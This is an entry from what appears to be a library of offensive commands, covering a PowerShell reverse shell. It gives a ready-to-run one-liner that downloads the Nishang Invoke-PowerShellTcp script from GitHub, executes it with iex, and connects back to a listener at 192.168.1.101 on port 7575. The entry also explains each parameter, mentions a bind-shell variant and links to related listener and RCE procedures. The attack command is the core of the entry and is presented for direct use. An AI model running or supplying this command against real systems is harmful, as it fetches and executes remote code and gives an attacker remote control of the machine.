---
id: cmd-005
data: >-
  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object
  Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp
  -Reverse -IPAddress 192.168.1.101 -Port 7575
tags:
  - powershell
  - reverse-shell
  - nishang
type: command
output: Establishes a reverse PowerShell session to the listener
executor: powershell
platforms:
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.692Z'
verified: false
validated: true
submitted: true
---
# powershell-reverse-tcp-shell

## Command

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.101 -Port 7575
```

## Description

Downloads and executes a Nishang PowerShell TCP shell script to establish a reverse connection to the specified IP and port.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `iex` | Invoke-Expression on downloaded script | Yes |
| `DownloadString` | Fetches script from GitHub URL | Yes |
| `Invoke-PowerShellTcp` | Runs shell with -Reverse, -IPAddress, -Port | Yes |

## Examples

### Basic Usage

As above for reverse connect.

### Advanced Usage

Bind shell variant: Change -Reverse to -Bind and adjust.

## Expected Output

Establishes a reverse PowerShell session to the listener.

## Related

- [[commands/nc-listen-reverse-shell]]
- [[procedures/Trigger-DNN-Cookie-Deserialization-for-RCE]]
